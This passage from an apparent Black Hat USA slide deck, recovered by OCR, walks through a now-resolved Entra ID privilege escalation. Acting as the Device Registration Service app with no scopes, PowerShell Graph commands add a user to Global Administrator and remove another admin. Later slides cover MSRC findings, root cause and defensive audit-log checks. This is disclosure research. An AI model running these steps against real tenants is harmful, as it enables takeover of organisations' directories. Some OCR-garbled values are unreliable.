> Read by a vision model from the page image (replacing unreliable OCR) — confidence 77/100 on the text kept, 73/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Windows PowerShell]

PS C:\temp> Get-MgDirectoryRole | Select-Object -Property DisplayName,ID

DisplayName                               Id
-----------                               --
Security Administrator                    128284a5-9a9e-49c3-a460-fd25554f8c45
Global Reader                             2863c272-b286-4077-b65f-6b1a5e72adc4
Azure AD Joined Device Local Administrator 4a2d4dc3-6634-44f2-a5a6-70ddedcfdc86
User Administrator                        77414df4-e2ff-42df-8a7d-58df04e65885
Directory Readers                         96c41d0e-04c8-476d-94df-603263509dc1
Global Administrator                      ae81c4d9-3b45-445b-896a-64aa7085db93
Directory Synchronization Accounts        b077747c-3953-408b-91f2-d6b58fdda0bc
Attribute Definition Administrator        b8508655-1331-4183-95ba-90a39d67e5ae
Application Administrator                 d383ec2f-f9ca-4e36-8230-225832c0c361
Conditional Access Administrator          dbdf8b40-4757-4900-8676-7f2a81c9a294

PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}

DisplayName        Id                                   Mail                                              UserPrincipalName
-----------        --                                   ----                                              -----------------
Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com    ga-eric@north...
Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                   ga-ericw@nort...

PS C:\temp>

[red highlight box around the command: Get-MgDirectoryRole | Select-Object -Property DisplayName,ID]

Caption: Gathering directory roles
```

## Slide 96

Targeting the Global Administrator role

**#BHUSA @BlackHatEvents**


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 77/100 on the text kept, 74/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
PS C:\temp> Get-MgDirectoryRole | Select-Object -Property DisplayName,ID

DisplayName                                Id
-----------                                --
Security Administrator                     128284a5-9a9e-49c3-a460-fd25554f8c45
Global Reader                              2863c272-b286-4077-b65f-6b1a5e72adc4
Azure AD Joined Device Local Administrator 4a2d4dc3-6634-44f2-a5a6-70ddedcfdc86
User Administrator                         77414df4-e2ff-42df-8a7d-58df04e65885
Directory Readers                          96c41d0e-04c8-476d-94df-603263509dc1
Global Administrator                       ae81c4d9-3b45-445b-896a-64aa7085db93
Directory Synchronization Accounts         b077747c-3953-408b-91f2-d6b58fdda0bc
Attribute Definition Administrator         b8508655-1331-4183-95ba-90a39d67e5ae
Application Administrator                  d383ec2f-f9ca-4e36-8230-225832c0c361
Conditional Access Administrator           dbdf8b40-4757-4900-8676-7f2a81c9a294

PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}

DisplayName        Id                                   Mail                                            UserPrincipalName
-----------        --                                   ----                                            -----------------
Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@north...
Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                  ga-ericw@nort...

PS C:\temp>

Targeting the Global Administrator role
```

## Slide 97

Gathering members of the Global Administrator role

**#BHUSA @BlackHatEvents**


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 76/100 on the text kept, 76/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
PS C:\temp> Get-MgDirectoryRole | Select-Object -Property DisplayName,ID

DisplayName                                Id
-----------                                --
Security Administrator                     128284a5-9a9e-49c3-a460-fd25554f8c45
Global Reader                              2863c272-b286-4077-b65f-6b1a5e72adc4
Azure AD Joined Device Local Administrator 4a2d4dc3-6634-44f2-a5a6-70ddedcfdc86
User Administrator                         77414df4-e2ff-42df-8a7d-58df04e65885
Directory Readers                          96c41d0e-04c8-476d-94df-603263509dc1
Global Administrator                       ae81c4d9-3b45-445b-896a-64aa7085db93
Directory Synchronization Accounts         b077747c-3953-408b-91f2-d6b58fdda0bc
Attribute Definition Administrator         b8508655-1331-4183-95ba-90a39d67e5ae
Application Administrator                  d383ec2f-f9ca-4e36-8230-225832c0c361
Conditional Access Administrator           dbdf8b40-4757-4900-8676-7f2a81c9a294

PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}

DisplayName        Id                                   Mail                                            UserPrincipalName
-----------        --                                   ----                                            -----------------
Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@north...
Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                  ga-ericw@nort...

PS C:\temp>

Gathering members of the Global Administrator role
```

## Slide 98

**#BHUSA @BlackHatEvents**


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 74/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Directory Synchronization Accounts         b077747c-3953-408b-91f2-d6b58fdda0bc
Attribute Definition Administrator         b8508655-1331-4183-95ba-90a39d67e5ae
Application Administrator                  d383ec2f-f9ca-4e36-8230-225832c0c361
Conditional Access Administrator           dbdf8b40-4757-4900-8676-7f2a81c9a294

PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}

DisplayName        Id                                   Mail                                            UserPrincipalName
-----------        --                                   ----                                            -----------------
Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@north...
Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                  ga-ericw@nort...

PS C:\temp> Get-MGUser -UserId megan.bowen@northwindtraders.cloud

DisplayName Id                                   Mail                               UserPrincipalName
----------- --                                   ----                               -----------------
Megan Bowen 936d55ce-a9b6-4a3b-ba1a-76340951d486 megan.bowen@northwindtraders.cloud megan.bowen@northwindtraders.cloud

PS C:\temp> $params = @{
>> "@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
>> roleDefinitionId = "62e90394-69f5-4237-9190-012177145e10"
>> principalId = "518e7196-367f-436b-83c7-764cca0a688c"
>> directoryScopeId = "/"
>> }
PS C:\temp>
```

## Slide 99

**#BHUSA @BlackHatEvents** Looking up a target user that we will attempt to add to Global Administrator


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 81/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Directory Synchronization Accounts         b077747c-3953-408b-91f2-d6b58fdda0bc
Attribute Definition Administrator         b8508655-1331-4183-95ba-90a39d67e5ae
Application Administrator                  d383ec2f-f9ca-4e36-8230-225832c0c361
Conditional Access Administrator           dbdf8b40-4757-4900-8676-7f2a81c9a294

PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}

DisplayName        Id                                   Mail                                            UserPrincipalName
-----------        --                                   ----                                            -----------------
Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@north...
Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                  ga-ericw@nort...

PS C:\temp> Get-MGUser -UserId megan.bowen@northwindtraders.cloud

DisplayName Id                                   Mail                               UserPrincipalName
----------- --                                   ----                               -----------------
Megan Bowen 936d55ce-a9b6-4a3b-ba1a-76340951d486 megan.bowen@northwindtraders.cloud megan.bowen@northwindtraders.cloud

PS C:\temp> $params = @{
>> "@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
>> roleDefinitionId = "62e90394-69f5-4237-9190-012177145e10"
>> principalId = "518e7196-367f-436b-83c7-764cca0a688c"
>> directoryScopeId = "/"
>> }
PS C:\temp>

Looking up a target user that we will attempt to add to Global Administrator
```

## Slide 100

**#BHUSA @BlackHatEvents** Splatting the Global Admin role definition ID and Megans object ID in a hash table to pass to our next command


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 82/100 on the text kept, 79/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Directory Synchronization Accounts         b077747c-3953-408b-91f2-d6b58fdda0bc
Attribute Definition Administrator         b8508655-1331-4183-95ba-90a39d67e5ae
Application Administrator                  d383ec2f-f9ca-4e36-8230-225832c0c361
Conditional Access Administrator           dbdf8b40-4757-4900-8676-7f2a81c9a294

PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}

DisplayName        Id                                   Mail                                            UserPrincipalName
-----------        --                                   ----                                            -----------------
Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@north...
Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                  ga-ericw@nort...

PS C:\temp> Get-MGUser -UserId megan.bowen@northwindtraders.cloud

DisplayName Id                                   Mail                               UserPrincipalName
----------- --                                   ----                               -----------------
Megan Bowen 936d55ce-a9b6-4a3b-ba1a-76340951d486 megan.bowen@northwindtraders.cloud megan.bowen@northwindtraders.cloud

PS C:\temp> $params = @{
>> "@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
>> roleDefinitionId = "62e90394-69f5-4237-9190-012177145e10"
>> principalId = "518e7196-367f-436b-83c7-764cca0a688c"
>> directoryScopeId = "/"
>> }
PS C:\temp>

Splatting the Global Admin role definition ID and Megans object ID in a hash table to pass to our next command
```

## Slide 101

**#BHUSA @BlackHatEvents**


> Recovered by OCR — confidence 78/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BY Windows PowerShell x + |» = Oo x
>> }
PS C:\temp> New-MgRoleManagementDirectoryRoleAssignment —BodyParameter $params
Id PrincipallId RoleDefinitionId
PS C:\temp> Get-MgContext
ClientId : @1cb2876-T7ebd—4aad—9cc9-d28bd4d359a9
TenantId : a8c79a2a—F998-4913-96d2-F45694b77bel
Scopes x
AuthType : AppOnly
TokenCredentialType : ClientSecret
CertificateSubjectName : =" :
Account : as
=| AppName : Device Registration Service
=| ContextScope : Process
~~~} PSHostVersion > 5.1.22621.2506 =
ClientSecret : System.Security.SecureString eee
Environment : Global meee
```

## Slide 102

**#BHUSA @BlackHatEvents** Assigning Megan the Global Administrator role


> Recovered by OCR — confidence 77/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BY Windows PowerShell x + |» = Oo x
>> }
PS C:\temp>|New-MgRoleManagementDirectoryRoleAssignment —BodyParameter $params
Id PrincipallId RoleDefinitionId
PS C:\temp> Get-MgContext
ClientId : @1cb2876-T7ebd—4aad—9cc9-d28bd4d359a9
TenantId : a8c79a2a—F998-4913-96d2-F45694b77bel
Scopes x
AuthType : AppOnly
TokenCredentialType : ClientSecret
CertificateSubjectName : =" :
Account : as
=| AppName : Device Registration Service
=| ContextScope : Process
~~~} PSHostVersion > 5.1.22621.2506 =
ClientSecret : System.Security.SecureString eee
Environment : Global meee
Assigning Megan the Global Administrator role : ‘ P #BHUSA @BlackHatEvents
```

## Slide 103

No 403 response!

The command worked, result output

**#BHUSA @BlackHatEvents**


> Recovered by OCR — confidence 89/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BY Windows PowerShell
>> }
PS C:\temp> New-MgRoleManagementDirectoryRoleAssignment —BodyParameter $params No 403 response!
Id
RoleDefinitionId
PS C:\temp> Get-MgContext
ClientId
TenantId
Scopes
AuthType
TokenCredentialType
CertificateThumbprint
CertificateSubjectName :
Account
5 AppName
ContextScope
Certificate
PSHostVersion
ManagedIdentityId
ClientSecret
Environment
: 01cb2876-7ebd—4aa4—9cc9-d28bd4d359a9
: AppOnly
: ClientSecret
: Device Registration Service
: Process
: 5.1.22621.2506
: System.Security.SecureString
: Global
The command worked, result output
#BHUSA
@BlackHatEvents
```

## Slide 104

Still no scopes

Verifying we are still acting as Device Registration Service and still have no scopes (permissions)

**#BHUSA @BlackHatEvents**

## Slide 105

**#BHUSA @BlackHatEvents**


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
ClientId                : 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
TenantId                : a8c79a2a-f998-4913-96d2-f45694b77be1
Scopes                  :
AuthType                : AppOnly
TokenCredentialType     : ClientSecret
CertificateThumbprint   :
CertificateSubjectName  :
Account                 :
AppName                 : Device Registration Service
ContextScope            : Process
Certificate             :
PSHostVersion           : 5.1.22621.2506
ManagedIdentityId       :
ClientSecret            : System.Security.SecureString
Environment             : Global

PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}

DisplayName        Id                                   Mail                                            UserPrincipalName
-----------        --                                   ----                                            -----------------
Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@north...
Megan Bowen        936d55ce-a9b6-4a3b-ba1a-76340951d486 megan.bowen@northwindtraders.cloud              megan.bowen@n...
Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                  ga-ericw@nort...

PS C:\temp>
```

## Slide 106

**#BHUSA @BlackHatEvents** Gathering our Global Administrator role members, with Megan Bowen now added


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 88/100 on the text kept, 84/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
ClientId                : 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
TenantId                : a8c79a2a-f998-4913-96d2-f45694b77be1
Scopes                  :
AuthType                : AppOnly
TokenCredentialType     : ClientSecret
CertificateThumbprint   :
CertificateSubjectName  :
Account                 :
AppName                 : Device Registration Service
ContextScope            : Process
Certificate             :
PSHostVersion           : 5.1.22621.2506
ManagedIdentityId       :
ClientSecret            : System.Security.SecureString
Environment             : Global

PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}

DisplayName        Id                                   Mail                                            UserPrincipalName
-----------        --                                   ----                                            -----------------
Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@north...
Megan Bowen        936d55ce-a9b6-4a3b-ba1a-76340951d486 megan.bowen@northwindtraders.cloud              megan.bowen@n...
Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                  ga-ericw@nort...

PS C:\temp>

Gathering our Global Administrator role members, with Megan Bowen now added
```

## Slide 107

**#BHUSA @BlackHatEvents**


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 77/100 on the text kept, 54/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
lAPpYvVpN0KRkAEhdxReEEh0fnPGk3dGtpckSTWxrYA-1 737e7448-93c6-4677-b697-244935b1ad80 62e90394-69f5-4237-9190-012177145e10
lAPpYvVpN0KRkAEhdxReEM5VbZO2qTtKuhp2NAlR1IY-1 936d55ce-a9b6-4a3b-ba1a-76340951d486 62e90394-69f5-4237-9190-012177145e10
lAPpYvVpN0KRkAEhdxReECaCFNdEdIRIrve1_mk6Z5g-1 d7148226-7444-4884-aef7-b5fe693a6798 62e90394-69f5-4237-9190-012177145e10
lAPpYvVpN0KRkAEhdxReEN21PuDWLchFroZPpvA441A-1 e03eb5dd-2dd6-45c8-ae86-4fa6f038e350 62e90394-69f5-4237-9190-012177145e10
4-PYiFWPHkqVOpuYmLiHa4_jmSP4HOdAkHnE1Ete6LI-1 2399e38f-1cf8-40e7-9079-c4d44b5ee8b2 88d8e3e3-8f55-4a1e-953a-9b9898b8876b
4-PYiFWPHkqVOpuYmLiHa2n-d5cDm2lCi4z6RgOKnUk-1 9777fe69-9b03-4269-8b8c-fa46038a9d49 88d8e3e3-8f55-4a1e-953a-9b9898b8876b
BSub0kaAukSHWB4mGC_PMszL8xvOpXREoMyjpaC6uMU-1 1bf3cbcc-a5ce-4474-a0cc-a3a5a0bab8c5 d29b2b05-8046-44ba-8758-1e26182fcf32
BSub0kaAukSHWB4mGC_PMl9f7lxUaptNuRB5u7pzZQ4-1 5cee5f5f-6a54-4d9b-b910-79bbba73650e d29b2b05-8046-44ba-8758-1e26182fcf32
LJnv8vs6uUa3z6Em7nTEUfTaHhBFa3pMhDM_tpKeOnM-1 101edaf4-6b45-4c7a-8433-3fb6929e3a73 f2ef992c-3afb-46b9-b7cf-a126ee74c451
LJnv8vs6uUa3z6Em7nTEUckh2rvrn5lGndXWsugf6_I-1 bbda21c9-9feb-4699-9dd5-d6b2e81febf2 f2ef992c-3afb-46b9-b7cf-a126ee74c451
5wuT_mJe20eRr5jDpJo4sfTaHhBFa3pMhDM_tpKeOnM-1 101edaf4-6b45-4c7a-8433-3fb6929e3a73 fe930be7-5e62-47db-91af-98c3a49a38b1
Phy-sV22GU-EJ_b6DZf-ufTaHhBFa3pMhDM_tpKeOnM-1 101edaf4-6b45-4c7a-8433-3fb6929e3a73 b1be1c3e-b65d-4f19-8427-f6fa0d97feb9
0gJe1hQCdEaOXXZvszDiwH9_a7vXTtZFpzUszwvtrdQ-1 bb6b7f7f-4ed7-45d6-a735-2ccf0bedadd4 d65e02d2-0214-4674-8e5d-766fb330e2c0
NIwd6_WsDUaEJMHxpvvbhX9_a7vXTtZFpzUszwvtrdQ-1 bb6b7f7f-4ed7-45d6-a735-2ccf0bedadd4 eb1d8c34-acf5-460d-8424-c1f1a6fbdb85
kl2Jm9Msx0SdAqasLV6lw8ibNp0FDYNPkJYhE-uX29U-1 9d369bc8-0d05-4f83-9096-2113eb97dbd5 9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3
8MYkhImhnkm70CbBdTyW1CaCFNdEdIRIrve1_mk6Z5g-1 d7148226-7444-4884-aef7-b5fe693a6798 8424c6f0-a189-499e-bbd0-26c1753c96d4

PS C:\temp> Remove-MgRoleManagementDirectoryRoleAssignment -UnifiedRoleAssignmentId lAPpYvVpN0KRkAEhdxReEEh0fnPGk3dGtpckSTWxrYA-1
PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}

DisplayName   Id                                   Mail                                            UserPrincipalName
-----------   --                                   ----                                            -----------------
Eric Woodruff d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@northwindt...
Megan Bowen   936d55ce-a9b6-4a3b-ba1a-76340951d486 megan.bowen@northwindtraders.cloud              megan.bowen@northw...

PS C:\temp>
```

## Slide 108

**#BHUSA @BlackHatEvents** We can also remove Global Administrator role assignment, in this example for a different existing Global Administrator

## Slide 109

**#BHUSA @BlackHatEvents** Gathering our Global Administrator role members, with a different Global Administrator now removed


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 60/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
lAPpYvVpN0KRkAEhdxReEEh0fnPGk3dGtpckSTWxrYA-1 737e7448-93c6-4677-b697-244935b1ad80 62e90394-69f5-4237-9190-012177145e10
lAPpYvVpN0KRkAEhdxReEM5VbZO2qTtKuhp2NAlR1IY-1 936d55ce-a9b6-4a3b-ba1a-76340951d486 62e90394-69f5-4237-9190-012177145e10
lAPpYvVpN0KRkAEhdxReECaCFNdEdIRIrve1_mk6Z5g-1 d7148226-7444-4884-aef7-b5fe693a6798 62e90394-69f5-4237-9190-012177145e10
lAPpYvVpN0KRkAEhdxReEN21PuDWLchFroZPpvA441A-1 e03eb5dd-2dd6-45c8-ae86-4fa6f038e350 62e90394-69f5-4237-9190-012177145e10
4-PYiFWPHkqVOpuYmLiHa4_jmSP4HOdAkHnE1Ete6LI-1 2399e38f-1cf8-40e7-9079-c4d44b5ee8b2 88d8e3e3-8f55-4a1e-953a-9b9898b8876b
4-PYiFWPHkqVOpuYmLiHa2n-d5cDm2lCi4z6RgOKnUk-1 9777fe69-9b03-4269-8b8c-fa46038a9d49 88d8e3e3-8f55-4a1e-953a-9b9898b8876b
BSub0kaAukSHWB4mGC_PMszL8xvOpXREoMyjpaC6uMU-1 1bf3cbcc-a5ce-4474-a0cc-a3a5a0bab8c5 d29b2b05-8046-44ba-8758-1e26182fcf32
BSub0kaAukSHWB4mGC_PMl9f7lxUaptNuRB5u7pzZQ4-1 5cee5f5f-6a54-4d9b-b910-79bbba73650e d29b2b05-8046-44ba-8758-1e26182fcf32
LJnv8vs6uUa3z6Em7nTEUfTaHhBFa3pMhDM_tpKeOnM-1 101edaf4-6b45-4c7a-8433-3fb6929e3a73 f2ef992c-3afb-46b9-b7cf-a126ee74c451
LJnv8vs6uUa3z6Em7nTEUckh2rvrn5lGndXWsugf6_I-1 bbda21c9-9feb-4699-9dd5-d6b2e81febf2 f2ef992c-3afb-46b9-b7cf-a126ee74c451
5wuT_mJe20eRr5jDpJo4sfTaHhBFa3pMhDM_tpKeOnM-1 101edaf4-6b45-4c7a-8433-3fb6929e3a73 fe930be7-5e62-47db-91af-98c3a49a38b1
Phy-sV22GU-EJ_b6DZf-ufTaHhBFa3pMhDM_tpKeOnM-1 101edaf4-6b45-4c7a-8433-3fb6929e3a73 b1be1c3e-b65d-4f19-8427-f6fa0d97feb9
0gJe1hQCdEaOXXZvszDiwH9_a7vXTtZFpzUszwvtrdQ-1 bb6b7f7f-4ed7-45d6-a735-2ccf0bedadd4 d65e02d2-0214-4674-8e5d-766fb330e2c0
NIwd6_WsDUaEJMHxpvvbhX9_a7vXTtZFpzUszwvtrdQ-1 bb6b7f7f-4ed7-45d6-a735-2ccf0bedadd4 eb1d8c34-acf5-460d-8424-c1f1a6fbdb85
kl2Jm9Msx0SdAqasLV6lw8ibNp0FDYNPkJYhE-uX29U-1 9d369bc8-0d05-4f83-9096-2113eb97dbd5 9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3
8MYkhImhnkm70CbBdTyW1CaCFNdEdIRIrve1_mk6Z5g-1 d7148226-7444-4884-aef7-b5fe693a6798 8424c6f0-a189-499e-bbd0-26c1753c96d4

PS C:\temp> Remove-MgRoleManagementDirectoryRoleAssignment -UnifiedRoleAssignmentId lAPpYvVpN0KRkAEhdxReEEh0fnPGk3dGtpckSTWxrYA-1
PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}

DisplayName   Id                                   Mail                                            UserPrincipalName
-----------   --                                   ----                                            -----------------
Eric Woodruff d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@northwindt...
Megan Bowen   936d55ce-a9b6-4a3b-ba1a-76340951d486 megan.bowen@northwindtraders.cloud              megan.bowen@northw...

PS C:\temp>

Gathering our Global Administrator role members, with a different Global Administrator now removed
```

## Slide 110

**#BHUSA @BlackHatEvents** Verifying our activity in our Entra ID audit logs (output from testing findings in another tenant)


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 80/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
{
    "id": "Directory_aa2ffcab-c207-4627-89b8-55df5295c687_Q2J8I_174301280",
    "category": "RoleManagement",
    "correlationId": "aa2ffcab-c207-4627-89b8-55df5295c687",
    "result": "success",
    "resultReason": "",
    "activityDisplayName": "Add member to role",
    "activityDateTime": "2024-01-05T21:16:16.2616937Z",
    "loggedByService": "Core Directory",
    "operationType": "Assign",
    "userAgent": null,
    "initiatedBy": {
        "user": null,
        "app": {
            "appId": null,
            "displayName": "Device Registration Service",
            "servicePrincipalId": "cb328f56-ab61-48d5-b1b9-129d7093b869",
            "servicePrincipalName": null
        }
    },
    "targetResources": [
        {
            "id": "a1c70ab4-a66b-42b5-bfea-5d8c44904912",
            "displayName": null,
            "type": "User",
            "userPrincipalName": "ReneMagi7@M365x61605097.OnMicrosoft.com",
            "groupType": null,
            "modifiedProperties": [
                {
                    "displayName": "Role.ObjectID",
                    "oldValue": null,
                    "newValue": "\"4fdbf417-b070-4a07-9337-1052f356e826\""
                },
                {
                    "displayName": "Role.DisplayName",
                    "oldValue": null,
                    "newValue": "\"Global Administrator\""
                },

Verifying our activity in our Entra ID audit logs (output from testing findings in another tenant)
```

## Slide 111

## The findings

- Device Registration Service Modify privileged role membership

- Viva Engage (Yammer) Delete and permanently delete privileged users

- Microsoft Rights Management Services Create users

#BHUSA @BlackHatEvents

## Slide 112

# Microsoft response

#BHUSA @BlackHatEvents

## Slide 113

## The findings

- Device Registration Service MSRC - Important severity, privilege elevation, resolved

- Viva Engage (Yammer) MSRC - Medium severity, resolved

- Microsoft Rights Management Services MSRC - Low severity, resolved

#BHUSA @BlackHatEvents

## Slide 114

## Why did this work?<sup>1</sup>

###### Microsoft Application

Microsoft Graph

Entra ID

##### 1Abstracted a bit

#BHUSA @BlackHatEvents

## Slide 115

## Why did this work?<sup>1</sup>

Microsoft Application

Microsoft Graph

Multiple Authorization Systems OAuth Scopes

Entra ID

##### 1Abstracted a bit

#BHUSA @BlackHatEvents

## Slide 116

## Why did this work?<sup>1</sup>

Microsoft Application

Microsoft Graph

Multiple Authorization Systems OAuth Other AuthZ Scopes Models

Entra ID

##### 1Abstracted a bit

#BHUSA @BlackHatEvents

## Slide 117

## Why did this work?<sup>1</sup>

Microsoft
Application

Microsoft Graph

Multiple Authorization Systems
OAuth  Other AuthZ Entra ID
Scopes Models

Entra ID

##### 1Abstracted a bit

#BHUSA @BlackHatEvents

## Slide 118

## Applications that support(ed) OAuth 2.0 CCGF

- Office 365 Exchange Online

- Office 365 SharePoint Online

- Dataverse

- Viva Engage (Yammer)

- Microsoft Rights Management Services

- Azure Multi-Factor Auth Client

- Skype for Business Online

- AADPasswordProtectionProxy

- Device Registration Service

#BHUSA @BlackHatEvents

## Slide 119

**#BHUSA @BlackHatEvents**


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 89/100 on the text kept, 84/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
PS C:\Temp> Connect-MGGraph -TenantID 11ae06df-10e8-4b9e-bf66-2a91f4955339 -ClientSecretCredential $CurrentCred
Connect-MgGraph: ClientSecretCredential authentication failed: A configuration issue is preventing authentication - check the error message from the server for details. You can modify the configuration in the application registration portal. See https://aka.ms/msal-net-invalid-client for details.  Original exception: AADSTS7000215: Invalid client secret provided. Ensure the secret being sent in the request is the client secret value, not the client secret ID, for a secret added to app '01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9'. Trace ID: f8eb1683-620a-4513-ad37-72fe7a704a00 Correlation ID: cb8d93e6-81f0-4627-ba20-f1c83f8ac99e Timestamp: 2024-06-05 12:38:22Z
PS C:\Temp>
```

## Slide 120

# Defense

#BHUSA @BlackHatEvents

## Slide 121

## Defense

- Findings permit privilege elevation

- We can look at audit log data and service principals for markers

#BHUSA @BlackHatEvents

## Slide 122

## Owning Global Administrator

Device Registration Service

Entra ID

Global Administrator Application Administrator Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 123

Owning Global Administrator Many organizations do not treat Application Administrator as Tier 0

Device Registration Service

Entra ID

Global Administrator

Application Administrator Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 124

## Owning Global Administrator

Device Registration Service

Entra ID

Global Administrator Application Administrator Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 125

## Owning Global Administrator

Device Registration Service

Entra ID

Global Administrator Application Administrator Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 126

## Owning Global Administrator

Device Registration Service

Entra ID

Global Administrator
Application Administrator
Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 127

## Owning Global Administrator

Device Registration Service

Entra ID

Global Administrator
Application Administrator
Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 128

## Owning Global Administrator

Device Registration Service

Entra ID
Global Administrator
Application Administrator
Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 129

## Owning Global Administrator

Device Registration Service

Entra ID
Global Administrator
Application Administrator
Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 130

## Owning Global Administrator

Azure
Entra ID
Microsoft 365
Global Administrator
Federated SaaS
Application Administrator
Cloud Application Administrator

